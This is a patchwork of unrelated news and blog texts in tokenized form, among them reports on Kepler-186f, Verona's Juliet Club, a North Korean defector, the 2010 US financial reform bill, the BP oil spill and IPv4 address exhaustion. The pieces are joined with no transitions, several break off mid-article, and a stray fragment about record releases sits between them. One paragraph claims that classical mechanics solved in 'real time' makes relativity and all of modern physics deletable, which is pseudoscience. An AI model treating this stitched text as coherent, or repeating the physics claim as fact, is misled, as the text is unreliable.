While the host star is dimmer than Earth 's sun and the planet is slightly bigger than Earth , the positioning of the alien world coupled with its size suggests that Kepler - 186 f could have water on its surface , scientists say .
You can learn more about the amazing alien planet find in a video produced by Space.com .
" One of the things we 've been looking for is maybe an Earth twin , which is an Earth - size planet in the habitable zone of a sunlike star , " Tom Barclay , Kepler scientist and co-author of the new exoplanet research , told Space.com .
" This [ Kepler - 186f ] is an Earth - size planet in the habitable zone of a cooler star .
So , while it 's not an Earth twin , it is perhaps an Earth cousin .
It has similar characteristics , but a different parent . " [ 10 Exoplanets That Could Host Alien Life ]

The rocky alien planet Kepler 186f is an Earth - size world that could have liquid water on its surface , and possibly even life .
It orbits a star 490 light - years away .
See the full details of alien planet Kepler - 186f in this Space.com infographic ( Image credit : By Karl Tate , Infographics Artist )
Potentially habitable planet
Scientists think that Kepler - 186 f — the outermost of five planets found to be orbiting the star Kepler - 186 — orbits at a distance of 32.5 million miles ( 52.4 million kilometers ) , theoretically within the habitable zone for a red dwarf .
Earth orbits the sun from an average distance of about 93 million miles ( 150 million km ) , but the sun is larger and brighter than the Kepler - 186 star , meaning that the sun 's habitable zone begins farther out from the star by comparison to Kepler - 186 .
" This is the first definitive Earth - sized planet found in the habitable zone around another star , " Elisa Quintana , of the SETI Institute and NASA 's Ames Research Center and the lead author of a new study detailing the findings , said in a statement .
Other planets of various sizes have been found in the habitable zones of their stars .
However , Kepler - 186 f is the first alien planet this close to Earth in size found orbiting in that potentially life - supporting area of an extrasolar system , according to exoplanet scientists .
' An historic discovery '
" This is an historic discovery of the first truly Earth - size planet found in the habitable zone around its star , " Geoff Marcy , an astronomer at the University of California , Berkeley , who is unaffiliated with the research , told Space.com via email .
" This is the best case for a habitable planet yet found .
The results are absolutely rock - solid .
The planet itself may not be , but I 'd bet my house on it .
In any case , it 's a gem . "
The newly discovered planet measures about 1.1 Earth radii , making it slightly larger than Earth , but researchers still think the alien world may be rocky like Earth .
Researchers still are n't sure what Kepler - 186 f 's atmosphere is made of , a key element that could help scientists understand if the planet is hospitable to life .
[ Kepler - 186 f : Earth - Size World Could Support Oceans , Maybe Life ( Infographic ) ]
" What we 've learned , just over the past few years , is that there is a definite transition which occurs around about 1.5 Earth radii , " Quintana said in a statement .
" What happens there is that for radii between 1.5 and 2 Earth radii , the planet becomes massive enough that it starts to accumulate a very thick hydrogen and helium atmosphere , so it starts to resemble the gas giants of our solar system rather than anything else that we see as terrestrial . "

The edge of habitability
Kepler - 186 f actually lies at the edge of the Kepler - 186 star 's habitable zone , meaning that liquid water on the planet 's surface could freeze , according to study co-author Stephen Kane of San Francisco State University .
Because of its position in the outer part of the habitable zone , the planet 's larger size could actually help keep its water liquid , Kane said in a statement .
Since it is slightly bigger than Earth , Kepler - 186 f could have a thicker atmosphere , which would insulate the planet and potentially keep its water in liquid form , Kane added .
" It [ Kepler - 186f ] goes around its star over 130 days , but because its star is a lower mass than our sun , the planet orbits slightly inner of where Mercury orbits in our own solar system , " Barclay said .
" It 's on the cooler edge of the habitable zone .
It 's still well within it , but it receives less energy than Earth receives .
So , if you 're on this planet [ Kepler - 186f ] , the star would appear dimmer . "

Exoplanet hunting in the future
Kepler - 186 f could be too dim for follow - up studies that would probe the planet 's atmosphere .
NASA 's James Webb Space Telescope —
Hubble 's successor , expected to launch to space in 2018 — is designed to image planets around relatively nearby stars ; however , the Kepler - 186 system might be too far off for the powerful telescope to investigate , Barclay said .
Scientists using the Kepler telescope discovered Kepler - 186 f using the transit method :
When the planet moved across the face of its star from the telescope 's perspective , Kepler recorded a slight dip in the star 's brightness , allowing researchers to learn more about the planet itself .
Kepler suffered a major malfunction last year and is no longer working in the same fashion , but scientists are still going through the spacecraft 's trove of data searching for new alien worlds .
" I find it simply awesome that we live in a time when finding potentially habitable planets is common , and the method to find them is standardized , " MIT exoplanet hunter and astrophysicist Sara Seager , who is unaffiliated with the research , told Space.com via email .
The new research was published online today ( April 17 ) in the journal Science .

I love it when comic books inspire real life action - assuming , of course , that real life action is n't dangerously akin to a Michael Bay movie .
Something more creative would be nice , like cosplay , although that too can yield disastrous effects .
Alright , how's this for a winner - photographic art inspired by " Black Hole " from photographer Max Oppenheim and prosthetic artist Bill Turpin :
For those who are n't aware , Charles Burns ' " Black Hole " is a 12 issue limited series that ran from 1995 through 2005 .
That 's lot of time without a lot of issues , but the story more than makes up for it with a close examination of youth culture by way of The Bug , a sexually transmitted disease that turns teenagers into horrid mutants .
Photographer Max Oppenheim and prosthetic artist Bill Turpin derived inspiration from " Black Hole " to produce a photo series transforming everyday high schoolers into the freakish kids populating Burns ' comic book series .
It 's a pretty amazing tribute that anyone can appreciate , even if you 're not particularly familiar with the source material .

To find the most romantic spot in Romeo and Juliet 's home city of Verona , you must take a dual carriageway out of the picturesque centre , then turn down a ramp into a decrepit industrial estate .
Beyond the cemetery , next to a railway siding , is an office whose stock - in - trade is people 's most passionately guarded secrets , their deepest hopes and fears .
The headquarters of the Club di Giulietta ( Juliet 's Club ) is also the inspiration for a soon - to - be - released movie .
Letters To Juliet tells the fictional story of a young American journalist who has joined this remarkable group of volunteers , replying to messages sent from all over the globe to Shakespeare 's heroine by lovers seeking advice , or an excuse to unburden themselves .
Sitting around a table strewn with handwritten letters , three of Juliet 's real " secretaries " , Giovanna Tamassia , Elena Marchi and Gioia Ambrosi , tell stories that are by turns touching and weird , thought - provoking and heart - rending .
" It 's a great responsibility , " says Tamassia , whose father Giulio is the club 's president and a founder member .
Ambrosi , a 25 - year - old student and the closest approximation to the heroine of Letters to Juliet ( played by Amanda Seyfried ) , describes the correspondence as " a blog on humanity " .
The film puts Juliet 's secretaries in an office overlooking the balcony of the house where it is claimed Shakespeare 's heroine lived .
While the club has an outpost there , the real work is done by 15 unpaid people in this little red - brick office next to the railway tracks .
As far as anyone knows , the first letter , addressed simply to " Juliet , Verona " , arrived in the 1930s , probably as the result of George Cukor 's film version of Shakespeare 's tragedy .
The letter found its way to " Juliet 's tomb " , another location of dubious authenticity , in the crypt of a monastery just outside the city walls .
The attendant there , a veteran who had picked up some English in the first world war , decided to reply .
And he carried on replying as more letters arrived .
After the second world war , a local poet secretly took on the role of Juliet 's secretary but gave it up , apparently in embarrassment , when his identity became known .
Finally , in the 80s , the then mayor of Verona decided to give the task to the Club di Giulietta , a group formed to promote initiatives linking their city to the play .
" We get more than 5,000 letters a year , " says Tamassia .
" And then there are the thousands of notes that get left behind at Juliet 's house and tomb . "
She reckons about three - quarters of the messages are from women , and that the biggest single group is made up of American teenagers .
On the wall of the arch leading to Juliet 's house in the medieval centre of Verona , though , there are notes in every conceivable language : full - blown letters and professions of undying love from Hamid to Zineb , from Xona to Katrina , in Chinese and in Serbo - Croat .
Some are genuinely poetic ( " For hope and love ; for the one I loved most , my lover , my heart , " in French ) ; others less so ( " I 've got a stomach ache in the heart , " complains a less - than - usually romantic Italian ) .
Even in early May , there is a constant people - jam beneath the arch as visitors cram in and out of the supposed home of a fictional character .
A notice tells visitors the house has been owned since the 1200s by a family called Capello , adding unequivocally that " from this derives the name Capuleti , the noble house of Juliet . "
Juliet 's house also has a postbox where letters can be left and four computer work stations , clad in mock - antique metal casings , where visitors may tap out a message to the girl who hung " upon the cheek of night like a rich jewel in an Ethiope 's ear " .
But surprisingly , perhaps , emails account for fewer than 10 % of the messages that end up in her secretaries ' offices .
Of the letters , the vast majority are handwritten with pen and ink .
And that is how they are always replied to .
" What people often write is : ' You are the only one who can understand me ' , " says Giovanni Carabetta , the club 's archivist .
Nigerian - born Franklin Ohenhn , who replaced his sister as one of Juliet 's secretaries , says he sometimes finds himself drawn into worlds that are as far as it is possible to imagine from gentle , picturesque Verona .
" One girl in the ninth grade told me she was crying as she wrote her letter , about a boyfriend who had been killed in a gang fight in the US . "
The most difficult letter he has dealt with was from another American teenager , who wanted to know if she should keep the baby of a boy she knew was playing around .
" I told her to follow her heart , " Ohenhn says with a shrug .
The secretaries can call on the services of a psychologist , and sometimes they need them .
" I think the strangest case we have in the archives is one that concerns a young man from Verona , " Tamassia says .
" When he was 24 years old , he was in a cemetery and saw the photograph of a young woman on a tomb .
She had been dead for decades , and the tomb was untended .
He began to look after it and gradually formed a relationship with her .
He lived it as if it were love . "
" In the end , nothing seems strange to us , " Tamassia adds .
She can only remember one case in which the club decided not to reply to a letter .
There was a period in which a number of American prison inmates wrote to Juliet , and one of them maintained a lengthy correspondence .
" He was someone with big problems in his life , and he told me all about them : his love for his girlfriend whom he had lost after being sent to prison ; his relationship with his father who had beaten him .
But then he became more and more insistent and , at a certain point , I got frightened .
He was asking for our address .
I decided to stop writing back , " she says .
Perhaps the most extraordinary aspect of this whole endeavour is that the secretaries do it for free .
" Well , the council gives us the money for the stamps , " explains Giulio Tamassia .
" But it 's not even enough [ to cover the postage ] .
Right now , I 'm having a battle with the council .
What we do brings all sorts of advantages for Verona , and I think it is time they stopped treating us like this .
We 're all working for nothing . "
Carabetta smiles .
" Not for nothing , Giulio . . .
For the pleasure of reading these wonderful letters . "
And perhaps , in some cases , for other , more personal reasons .
" It has helped me to believe again in feelings , " says Marchi .
" If a love affair is happy , it is happy .
But what counts is to have a heart that is alive , no ?
To be in touch with your feelings , however things go .
It 's not as if there is a guarantee as to the future . "
A sentiment with which the real – or rather , fictional – Juliet would have fervently agreed .
• Letters to Juliet is released in the UK on June 9 .
To get the rest of the Rno Records releases go to :
Kim Jong Ryul is a slightly built and lively 75 - year - old with large glasses and a gray suit that seems several sizes too big .
But Kim wears it anyway .
It is virtually his only connection to his past .
“ This is the suit I had on , ” the North Korean native explains , “ when I escaped . ”
About 15 years ago , Kim says , he exchanged his upper - echelon North Korean government job for a lonely underground existence in Austria , where he remains in constant fear of assassination .
Kim is one of thousands who in recent years have run from the North Korean government ’s grip .
But his personal history , the subject of a new book , offers a rare taste of a higher - level North Korean ’s contempt for his country ’s totalitarian rulers , an anger that gave him the will to turn his back on his life and his loved ones .
For 20 years , the mechanical engineer and onetime army colonel who went to college in the former East Germany purchased industrial goods , luxury Mercedes - Benz cars and weapons for the North Korean leadership .
His shopping list also included such sensitive items as mass spectrometers that can be used , among other purposes , in identifying uranium and plutonium particles .
Kim spoke fluent German , English and Japanese , having learned the latter , he says , from watching TV .
Young , intelligent and well educated , he was the perfect person to send on lavish shopping sprees to Europe .
Vienna was the ideal hub for business dealings in Germany , Switzerland and France , he says .
Through intermediary companies , he even bought goods from the United States , including the spectrometers , which are on the Nuclear Suppliers Group ’s list of restricted , dual - use equipment , and pistols that North Korean leaders ardently collected .
“ They all knew this was for North Korea , ” he says , speaking of the middlemen he worked with .
But his offers were difficult to resist , he says , because he paid in cash , 30 % over the usual asking price .
At the same time , he says , he was secretly making a Western - style profit for himself .
Without the knowledge of his comrades , he generally kept about 3 % of the money from each deal , setting up a secret account in the Austrian private bank Schoellerbank , where he eventually amassed about $ 300,000 .
In October 1994 , Kim says , he fled to Austria , faking his death and going into hiding .
“ I lived for 15 years like a mole . ”
Finally , he had enough and decided to tell his story to two Austrian journalists .
The book spotlights his escape and his descriptions of the decadence and arrogance of North Korea ’s leaders , who spared no expense to obtain whatever they craved while their own people were starving to death .
“ After I turned 70 years old , I thought , I may die soon , and that is why I wanted to do this book , ” Kim says during an interview in the office of his publisher in Vienna .
Kim says he sees no hope for political change in his homeland or of ever again seeing his wife , now 70 , his 45 - year - old son and his 39 - year - old daughter .
“ I abandoned my family 17 years ago . ”
The public stance that Kim is now taking differs from that of many North Korean defectors , who use pseudonyms or demand anonymity when they speak about their homeland or their life afterward .
In his years of freedom in Austria , Kim says , he has lived a lonely existence in a small village outside Vienna .
He has maintained a low profile , paid all bills on time and otherwise steered clear of trouble so as not to attract attention .
“ I have no friends , ” he says .
“ My principle was not to make many friends because I could start talking , then I might tell them something about myself and this would not be good . ”
First he insists that his neighbors know his true story , but later says that they do n’t .
“ Nobody asks .
They only greet and want to know what I will cook today , ” Kim says , laughing .
“ This book will be the death of me , ” he says , but it seems that this thought does n’t scare him much .
Kim is fully aware that by speaking up he has also endangered his family in North Korea , with whom he has had no contact since he left Pyongyang in 1993 .
“ They will not kill my family , but will kick them out of the capital . ”
He says he is sorry for this but his need to tell his story to the world is more important .
“ With this book I wanted to shout out loud for a last time , and then die .
I want to expose these two Kims , the two dictators [ the late Kim Il Sung and his son Kim Jong Il ] , to criticize them and to say that they are [ terrible people ] and their policy is filthy , ” Kim says .
And still , the tiny but tough man does not sound as though he is going to give up on life just yet .
“ Tomorrow or after tomorrow I will go into hiding again . ”
He smiles and assures a listener that he can easily disappear because he knows Austria so well .
Or maybe he will go abroad .
First , however , he will have to see the Austrian police about all the illegal dealings he was involved in during his two decades in the service of the North Korean government .
His next appointment is to officially apply for asylum because Kim Jong Ryul is no incognito refugee in Austria anymore .

FINANCIAL reform is coming to America .
On May 20th , after more than three weeks of often rancorous debate , the Senate approved the biggest overhaul of the financial system since the Great Depression , by 59 votes to 39 .
Its bill must now be reconciled with one passed by the House of Representatives in December .
The result will be Barack Obama 's second big legislative victory of the year , after the passage of health - care reform in March .
Tim Geithner , Mr Obama 's treasury secretary , praised Chris Dodd and Harry Reid , the Democratic senators who steered the 1,500 - page Restoring American Financial Stability
Act to a successful vote , for their “ tremendous leadership ” .
The administration has reason to be pleased , since the bill largely mirrors the reform blueprint it had been pushing .
As with most bills , this one has its share of pork and irrelevant provisions , including one requiring buyers of Congolese minerals to prove that the money they hand over is not being used to fund militant groups .
But there is much meat at its heart .
The bill would beef up the system for monitoring systemic risks .
It would empower the Federal Deposit Insurance Corporation to wind down failing financial giants , imposing losses on creditors as well as shareholders .
It would create an independent consumer financial - protection bureau .
And it would toughen up oversight of derivatives , requiring most contracts to be channelled through clearing houses and traded on exchanges or exchange - like platforms .
Could this bill have prevented the crisis ?
Not by itself .
Some of the most important reforms are outside its purview .
Toughened - up capital and liquidity standards for banks will be hammered out by regulators from around the world in Basel .
The Obama administration 's proposed tax on big banks will likely be advanced in different legislation .
One glaring omission from the Senate and House bills is a plan to deal with Fannie Mae and Freddie Mac , the giant , accident - prone mortgage agencies now under government conservatorship .
The most important component aimed at preventing another crisis is “ resolution authority ” , under which any big financial company , not just a bank , can be seized and wound down in an orderly way .
Lack of such authority led to the shambolic failure of Lehman Brothers and the controversial bail - out of AIG .
To win Republican support , however , Mr Dodd made the process so harsh for unsecured creditors that they might flee if they sense panic building — forcing the authorities , again , to use ad - hoc measures .
Left unanswered is how bail - outs will be paid for .
The House version of the bill requires banks to chip in to a $ 150 billion up - front fund .
The Senate bill envisages the costs being recouped afterwards , another concession to Republicans .
The new consumer - protection bureau should help to close the gap between well - regulated banks and poorly regulated mortgage brokers and finance companies , which led the race to the bottom in loan - underwriting standards .
But many firms are exempted from its authority .
Small banks must follow its rules but will be supervised by existing regulators .
And the industry gripes that there is remarkably little independent oversight of the bureau , should it run amok with new regulations that stifle legitimate products .
The Senate bill puts the bureau inside the Federal Reserve , though it gives the Fed little say in its direction ; in the House version , the bureau stands alone .
Surprisingly , given the depth of congressional animosity towards it , the Fed emerges as a big winner .
It keeps all its existing bank - supervision powers ( except for consumer protection ) and gets new ones over systemically important non-banks .
In a crucial victory , the Fed and the White House fought off a provision that would have allowed intrusive congressional audits of the central bank 's most delicate monetary - policy decisions .
However , such a provision remains in the House version of the bill .
As for Wall Street itself , the outcome is worse than initially expected but better than it might have been — though uncertainties remain .
Bankers had hoped that the bill emerging from the Senate - usually the more measured of the two chambers - would be more bank - friendly than the House version .
But a flurry of draconian amendments was offered in recent weeks amid a surge in anti-bank sentiment ( fuelled by fraud charges against Goldman Sachs ) and political populism in the run-up to congressional primaries .
Among those approved was one requiring the Fed to regulate debit - card fees , another setting minimum mortgage - underwriting standards ( and banning no-documentation “ liar loans ” ) and a third requiring credit ratings of asset - backed securities to be assigned by a board within the Securities and Exchange Commission .
But a proposal to cap banks ' maximum size was defeated , as was one that would have placed restrictions on credit - card interest rates .
But some of banks ' biggest worries remain unresolved .
They are resigned to accept some form of the “ Volcker rule ” , which would restrict their proprietary trading and investment in hedge funds and private equity .
A particularly tough version of the rule was rejected just before the Senate vote , but its authors hold out hope that it can be inserted during the weaving - together of the House and Senate bills .
The Volcker rule and other looming restrictions could collectively cut large banks ' profits by as much as 15 - 20 % ( not counting returned capital from shed businesses ) , reckon analysts at Morgan Stanley .
Wall Street 's biggest concern is a provision banning deposit - takers from trading credit - default swaps , interest - rate swaps and the like .
Introduced by the head of the Senate Agriculture Committee some weeks ago , it was expected that this would fall by the wayside during debate .
But it proved stubbornly persistent , making it into the bill as passed .
Ostensibly aimed at raising a firewall between run -of - the - mill retail banking and “ casino ” activities , such a prohibition would hinder risk management as well as speculation , banks argue .
All eyes will now be on the “ conference ” process that will likely be used to iron out differences between the two bills over the next week or two .
This will provide one last lobbying opportunity to Wall Street , which has already spent hundreds of millions trying to influence lawmakers , to the president 's chagrin .
Banks will focus much of their effort on reversing the swap - dealing ban ( which is also opposed by their regulators ) .
Where the two chambers differ , the Senate prevails as a rule — though Barney Frank , the architect of the House bill , has said he will fight to preserve some of his provisions .
Once Mr Obama signs the law , many of its vaguer provisions will have to be fleshed out by financial regulators , a process that could take many months .
There are plenty of ambiguities to be tackled , for instance the bills ' loose definition of “ swap ” and “ major swap participant ” .
After the Senate bill was passed , Mr Obama pledged to “ ensure that we arrive at a final product that …secures financial stability while preserving the strengths and crucial functions of a financial industry that is central to our prosperity and ability to compete in a global economy . ”
That remains to be seen .
If the history of financial legislation is a guide — just think Sarbanes - Oxley — the new law will have more than a few unintended consequences .
For now , though , the White House can revel in a political triumph that a year ago seemed to many to be beyond reach .
One MacRumors reader emailed Steve Jobs in a followup about the widely publicized iPhone 4 signal issues that have been reported across the web .
In particular , was asking about Apple 's policy on giving free bumper cases to alleviate the issue .
" I love everything about the phone except my signal issues " , he wrote .
Steve Jobs reportedly replied immediately with :
There are no reception issues .
Stay Tuned .
The response is notable in that it is not simply a copy / paste of the official statement from Apple .
Steve Jobs had previously been replying to all signal inquiries on Friday with the same generic statement published Thursday :
Gripping any phone will result in some attenuation of its antenna performance , with certain places being worse than others depending on the placement of the antennas .
This is a fact of life for every wireless phone .
If you ever experience this on your iPhone 4 , avoid gripping it in the lower left corner in a way that covers both sides of the black strip in the metal band , or simply use one of many available cases .
That public statement from Apple essentially described the issue as a normal phenomenon .
Today 's email provides users some hope that a fix might somehow be on the way .
In fact , one report even claimed an iOS update as early as Monday might be able to relieve the issue due to a lag in the iPhone 4's ability to switch between frequencies causing the loss in signal .

WASHINGTON ( AP ) 
Days after the Gulf Coast oil spill , the Obama administration pledged to keep its " boot on the throat " of BP to make sure the company did all it could to cap the gushing leak and clean up the spill .
But a month after the April 20 explosion , anger is growing about why BP PLC is still in charge of the response .
" I 'm tired of being nice .
I 'm tired of working as a team , " said Billy Nungesser , president of Plaquemines Parish in Louisiana .
" The government should have stepped in and not just taken BP 's word , " declared Wayne Stone of Marathon , Florida , an avid diver who worries about the spill 's effect on the ecosystem .

Oil spews into the Gulf
That sense of frustration is shared by an increasing number of Gulf Coast residents , elected officials and environmental groups who have called for the government to simply take over .
In fact , the government is overseeing things .
But the official responsible for that says he still understands the discontent .
" If anybody is frustrated with this response , I would tell them their symptoms are normal , because I 'm frustrated , too , " said Coast Guard Commandant Thad Allen .
" Nobody likes to have a feeling that you can't do something about a very big problem , " Allen told The Associated Press Friday .
Still , as simple as it may seem for the government to just take over , the law prevents it , Allen said .
After the 1989 Exxon Valdez spill in Alaska , Congress dictated that oil companies be responsible for dealing with major accidents — including paying for all cleanup — with oversight by federal agencies .
Spills on land are overseen by the Environmental Protection Agency , offshore spills by the Coast Guard .
" The basic notion is you hold the responsible party accountable , with regime oversight " from the government , Allen said .
" BP has not been relieved of that responsibility , nor have they been relieved for penalties or for oversight . "
He and Coast Guard Adm. Mary Landry , the federal onsite coordinator , direct virtually everything BP does in response to the spill — and with a few exceptions have received full cooperation , Allen said .
White House press secretary Robert Gibbs was even more emphatic .
" There 's nothing that we think can and should be done that is n't being done .
Nothing , " Gibbs said Friday during a lengthy , often testy exchange with reporters about the response to the oil disaster .
There are no powers of intervention that the federal government has available but has opted not to use , Gibbs said .
Asked if President Obama had confidence in BP , Gibbs said only : " We are continuing to push BP to do everything that they can . "
BP spokesman Neil Chapman said the federal government has been " an integral part of the response " to the oil spill since shortly after the April 20 explosion .
" There are many federal agencies here in the Unified Command , and they 've been part of that within days of the incident , " said Chapman , who works out of a joint response site in Louisiana , near the site of the explosion of the Deepwater Horizon oil rig .
Criticism of the cleanup response has spread beyond BP .
On Friday , the Texas lab contracted to test samples of water contaminated by the spill defended itself against complaints that it has a conflict of interest because it does other work for BP .
TDI - Brooks International Inc. , which points to its staffers ' experience handling samples from the Exxon Valdez disaster , said the National Oceanic and Atmospheric Administration and the U.S. Fish and Wildlife Service helped audit the lab and approved its methods .
" A typical state laboratory does not have this experience or capacity , " TDI president James M. Brooks said .
The company 's client list includes federal and state agencies along with dozens of oil companies , among them BP , a connection first reported by The New York Times .
TDI - Brooks said about half of the lab 's revenue comes from government work .
Test results on Deepwater Horizon samples will figure prominently in lawsuits and other judgments seeking to put a dollar value on the damage caused by the spill .
Deputy Interior Secretary David Hayes , who traveled to the Gulf the day after the explosion and has coordinated Interior 's response to the spill , rejected the notion that BP is telling the federal government what to do .
" They are lashed in , " Hayes said of BP .
" They need approval for everything they do . "
If BP is lashed to the government , the tether goes both ways .
A large part of what the government knows about the oil spill comes from BP .
The oil company helps staff the command center in Robert , La. , which publishes daily reports on efforts to contain , disperse and skim oil .
Some of the information flowing into the command center comes from undersea robots run by BP or ships ultimately being paid by BP .
When the center reported Friday that nearly 9 million gallons of an oil - water mixture had been skimmed from the ocean surface , those statistics came from barges and other vessels funded by BP .
Allen , the incident commander , said the main problem for federal responders is the unique nature of the spill — 5,000 feet below the surface with no human access .
" This is really closer to Apollo 13 than Exxon Valdez , " he said referring to a near - disastrous Moon mission 40 years ago .
" Access to this well - site is through technology that is owned in the private sector , " Allen said , referring to remotely operated vehicles and sensors owned by BP .
Even so , the company has largely done what officials have asked , Allen said .
Most recently , it responded to an EPA directive to find a less toxic chemical dispersant to break up the oil underwater .
In two instances — finding samples from the bottom of the ocean to test dispersants and distributing booms to block the oil — BP did not respond as quickly as officials had hoped , Allen said .
In both cases they ultimately complied .
" Personally , whenever I have a problem I call ( BP CEO ) Tony Hayward " on his cellphone , Allen said .

Well this sounds like a really stupid plan :
MR. GREGORY : What about the issue of legitimate claims , as BP said , that it will honor ?
Do you think that the cap for damages should be higher now , higher than $ 75 million , as you heard Senator Schumer say they would propose ?
SEN .
McCONNELL : Well , the danger in that , of course , is that if you raise the cap too high , there will be no competition in the Gulf and you ’ll leave all the business to the big guys like BP .
What BP has said they need to be held to , which is they ’re going to pay for this .
They ought to pay for it , and they will pay for it .
But the danger of taking the cap too high is that you end up with only massive , very large oil producers able to meet that cap and produce in the Gulf .
McConnell says he 's concerned that a high cap would discourage companies from drilling offshore .
But if they can't afford to pay for the damage that drilling can cause , why should they drill in the first place ?
It 's hard to defend any sort of liability cap on oil companies , let alone a $ 75 million cap .
Why should they be entitled to unlimited profits if they can't be held accountable for unlimited damage ?
But let 's pretend that McConnell 's objection were valid .
If so , the proper solution would be to tie the liability limit to the size of the company .
But he 's not proposing that , underscoring his utter lack of sincerity .
Mitch McConnell believes that BP will voluntarily agree to waive the liability cap .
Rather , he says he believes that , because he can't really be so dumb as to believe BP wo n't try to screw over as many people as possible as soon as the spotlight is off them .
In fact , even with the spotlight still on BP , it 's already making moves to limit its exposure .
Yet McConnell dishonestly urges us to trust BP 's promise to pay every claim .
That 's crazy .
The only thing we can really trust is that big oil is going to line Mitch McConnell 's pockets and those of his Republican colleagues .

For 350 years classical physics is solved in event time .
When classical physics is solved in real time it produced quantum mechanics as a visual or real time measurement of classical mechanics that is nature is classical and seen as quantum in real time and the difference between real time solution ( time dependent ) and classical solution ( time independent ) is relativistic .
Meaning the solution of Classical mechanics in real time annexes quantum mechanics to classical mechanics and deletes relativity and string theory .
Meaning , Modern Physics in its entirety can be deleted without loss to the subject of physics .

Organizations slow to adopt IP v6 take heed : Surging requests for IP v4 addresses are quickly drying up the available store , raising the specter of an IP v4 black market that could dramatically increase the cost of obtaining a presence on today 's Internet .
Previous predictions pegged late 2011 as the anticipated date of IP v4 address exhaustion .
But a sudden turnaround in the rate of allocation for IP v4 addresses this year has consumed an alarming number of " / 8 " IP v4 address blocks -- /8 being the unit of allocation to Regional Internet Registries ( RIRs ) .
" There were just eight / 8 allocations in all of 2009 , but there have been six / 8s issued just in the first 100 days of 2010 , " notes American Registry for Internet Numbers ( ARIN ) CIO Richard Jimmerson .
[ Get expert networking how - to advice from InfoWorld 's Networking Deep Dive PDF special report .

Keep up on the latest networking news with our Technology : Networking newsletter . ]
As of this writing , only 20 IP v4 / 8s remain in the Internet Assigned Numbers Authority ( IANA ) pool of 256 / 8s .
At the current rate , the IANA pool may well be exhausted by the end of this year ( see graph ) .
And though the transition from IP v4 to IP v6 has been long anticipated , many organizations are ill - prepared for the fallout of IP v4 exhaustion .
In addition to being required to maintain Web presence in both address spaces until the Internet 's transition is complete , new services , such as Microsoft 's DirectAccess , are increasingly becoming available only on IP v6 , as tech vendors and service providers increasingly find IP v4 too expensive to support .
IP v4 black market : A matter of supply and demand
The coming IP v4 shortage has been foreseen for years , but organizations needing an Internet presence -- businesses , educational institutions , government agencies , and the like -- have largely been in denial about the inevitability of IP v4 exhaustion .
At last October 's dual celebration of ARPAnet ( the Advanced Research Projects Agency Network that preceded the Internet ) and the 125th anniversary of event sponsor IEEE , Internet pioneer Vincent Cerf urged immediate IP v6 adoption because Internet growth is not slowing : " We are going to see billions and billions of devices on the Net .
The Internet , for its part , has invited many people to contribute content . "
In a more recent interview , ARIN 's Jimmerson says , " Yes , there was a dip [ of IPv4 assignments ] in 2009 , but 2010 is accelerating .
Lots of new applications -- next - gen Wi -Fi , cloud services , and smart grid -- are taking off , and regions such as Asia and South America are coming online rapidly . "
IPv4 , which uses 32 - bit addresses , is capable of supporting 4.3 billion total addresses , but severe fragmentation makes utilization of the full range of IP addresses inefficient .
Worse , many consider reclaiming unused IP space a far too complex and expensive undertaking .
As such , when the last IP v4 / 8 is allocated , new Internet players could find high prices and a black market the only practical means of getting IP v4 addresses .
Well - known Internet engineer and notable Internet " pseudo - economist " R. Kevin Oberman points out that this black market already exists , albeit on a small scale .
" The probability of black market growth depends on how run-out of IP v4 addresses is handled by the regional registries , " Oberman says .
" A black market is uncontrolled by definition .
If you have a commodity that has value and is required for commerce , the price will rise to whatever willing buyers will pay . "
Currently , Oberman notes , IP v4 addresses are still relatively easy to get , because significant anti-fraud measures have n't yet been put in place by registries such as ARIN .
" Most of the current black market is a matter of convenience , because ARIN 's IP v4 costs , and those of other registries , are low for large organizations .
But if you 're a small company , the expense can be fairly high , " Oberman says .
" If the survival of your business depends on getting IP v4 addresses , you 'll be willing to pay for them , even if you have to skirt the rules . "
Oberman believes that regional registries such as ARIN should head off a potentially deleterious black market by creating a " white market " with established rules for trading IP v4 addresses at market - established costs .
" If people have legitimate rules that permit address transfers , they 'll use them instead of a black market , " Oberman says .
IPv6 , which uses 128 - bit addresses , can support an essentially unlimited address space : 2 to the 128th power , or 3.4 with 38 zeros after it .
But the opportunity to cleanly switch from IP v4 to IP v6 passed many years ago .
The current transition strategy , called " dual stack , " requires businesses to remain connected to both IPv4 and IP v6 networks until most of the Internet gets to " the other side " -- a process expected to take at least five years .
Until then , the cost ramifications of IP v4 exhaustion will be widespread .
IP v4 black market :
The rising cost of scarcity ARIN's Jimmerson agrees that an accelerating black market for IP v4 addresses is possible .
Yet ARIN 's membership has been proactive about providing at least limited address transfer opportunities to mitigate that problem , Jimmerson says .
" ARIN is a member - driven organization , but even non-members from the Internet community at large can participate in the policy development process , " Jimmerson notes .
" That community has proposed a policy change , which ARIN recently adopted , to permit an IP v4 registrant to transfer numbers to another party . "
Under that new rule , a company can return IP v4 numbers to ARIN and designate the intended recipient .
ARIN is n't involved in any financial transaction that may occur between the parties , and only promises the recipient will receive the addresses if the recipient first files , and ARIN approves under its transfer guidelines , the necessary usage justification forms .
" There may still be black market activity , but with this policy , it 's more likely that people will transfer numbers out in the open , " says Jimmerson .
" The important thing is that IP v4 registration records accurately identify the registrant who has authority over each allocation . "
Jimmerson believes organizations are less likely to engage in black marketing if their business names are attached to the numbers being trafficked .
" It 's very likely that over the next year the community will continue to fine - tune the address allocation policy set , which includes both IP v4 and IPv6 , " Jimmerson says .
Such a move could mean price increases as depletion nears .
Under today 's rules , a small organization would pay a minimum of $ 1,250 annually for a / 24 assignment , which represents 256 addresses , the smallest block that can be portably routed on the Internet .
Smaller allocations than this must be obtained from an ISP , at the cost of a few dollars per month per IP address .
Larger organizations could pay between $ 4,500 and $ 18,000 per year , but in all cases address holders must provide justification to their registry to continue using IP v4 allocations .
IP v4 black market : Staving off inevitability
As IP v4 nears exhaustion , Oberman 's vision of a pricey black market could still materialize , even with ARIN 's new transfer policy .
" The problem is big enough that you 'll never have 100 percent enforcement , which is why we have a small black market today , " Oberman says .
" People could start speculating , and that will drive prices up on both black and white markets . "
A possible stress reliever could come in the form of forced reclamation of unused , or fraudulently used , IP space .
" The community had an opportunity two years ago to choose reclamation over the new transfer policy .
We determined that reclamation could gain four to six / 8s , which would be a painful process that at best that would forestall exhaustion four to six months , " says Jimmerson .
But ARIN and its sister registries have the authority to reclaim space if necessary , because users are only loaned use of IP numbers .
" ARIN has put a lot of energy into anti-fraud procedures , " says Jimmerson .
" As we run out of this valuable resource , we actively apply these anti-fraud measures that include vetting organizations , scrutinizing justification , as well as providing a mechanism for people to report fraud and misuse , to avoid hoarding and speculation . "
Jimmerson points out a twist to the IP v4 exhaustion problem :
